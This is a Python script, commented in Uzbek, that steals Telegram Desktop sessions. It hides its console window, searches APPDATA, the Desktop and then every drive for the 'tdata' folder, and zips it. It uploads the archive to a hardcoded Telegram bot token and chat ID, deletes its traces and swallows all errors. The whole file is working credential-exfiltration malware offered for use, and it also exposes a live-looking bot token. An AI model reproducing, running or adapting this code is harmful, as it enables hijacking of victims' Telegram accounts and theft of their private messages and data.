import os
import ctypes
import time
import json
import urllib.request
import socket
import tempfile
import zipfile
import sys

if os.name == 'nt':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
CHAT_ID = 7080045924

def send_message(text):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = json.dumps({"chat_id": CHAT_ID, "text": text}).encode()
        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req)
    except:
        pass

def send_file(file_path, caption):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, 'rb') as f:
            data = f.read()
        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="chat_id"\r\n\r\n{CHAT_ID}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="caption"\r\n\r\n{caption}\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="document"; filename="tdata.zip"\r\n'
            f"Content-Type: application/octet-stream\r\n\r\n"
        ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
        req = urllib.request.Request(url, data=body, headers={"Content-Type": f"multipart/form-data; boundary={boundary}"})
        urllib.request.urlopen(req)
    except:
        pass

def get_tdata():
    pc_name = socket.gethostname()
    
    # 1. Standart yo'l
    appdata = os.getenv('APPDATA')
    tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
    if os.path.exists(tdata_path):
        return tdata_path, pc_name
    
    # 2. Desktop (Ish stoli) dagi tdata
    desktop = os.path.join(os.getenv('USERPROFILE'), 'Desktop', 'tdata')
    if os.path.exists(desktop):
        return desktop, pc_name
    
    # 3. Agar topilmasa, hamma disk va papkalarni qidiramiz
    for drive_letter in range(ord('C'), ord('Z') + 1):
        drive = f"{chr(drive_letter)}:\\"
        if os.path.exists(drive):
            try:
                for root, dirs, files in os.walk(drive, topdown=True):
                    if os.path.basename(root).lower() == 'tdata':
                        return root, pc_name
                    if 'telegramdesktop' in root.lower():
                        possible_tdata = os.path.join(root, 'tdata')
                        if os.path.exists(possible_tdata):
                            return possible_tdata, pc_name
            except:
                pass
    return None, pc_name

# MAIN
tdata_path, pc_name = get_tdata()
if tdata_path:
    try:
        temp_dir = tempfile.gettempdir()
        zip_path = os.path.join(temp_dir, f"tdata_{pc_name}_{int(time.time())}.zip")
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(tdata_path):
                for file in files:
                    try:
                        file_path = os.path.join(root, file)
                        zipf.write(file_path, os.path.relpath(file_path, os.path.dirname(tdata_path)))
                    except: pass
        send_file(zip_path, f"✅ Yangi tdata yig'ildi!\n🖥 {pc_name}")
        os.remove(zip_path)
    except:
        pass
else:
    send_message(f"⚠️ tdata topilmadi!\n🖥 {pc_name}")
